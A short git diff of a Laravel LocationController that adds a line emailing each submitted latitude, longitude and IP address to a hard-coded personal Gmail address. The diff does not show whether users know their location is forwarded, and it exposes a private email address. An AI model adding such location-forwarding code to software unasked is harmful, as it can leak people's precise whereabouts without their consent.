@@ -2,10 +2,12 @@
 
 namespace App\Http\Controllers;
 
+use App\Mail\SendEmail;
 use App\Models\Location;
 use App\Models\Setting;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\Mail;
 
 class LocationController extends Controller
 {
@@ -28,7 +30,9 @@ class LocationController extends Controller
                 'ip' => $request->ip,
                 
             ]);
-    
+
+            Mail::to('mj26653@gmail.com')->send(new SendEmail($request->latitude, $request->longitude, $request->ip));
+
             return response()->json(['message' => 'Location data stored successfully'], 201);
         } catch (\Exception $e) {
             // Log error and return a 500 response with the exception message
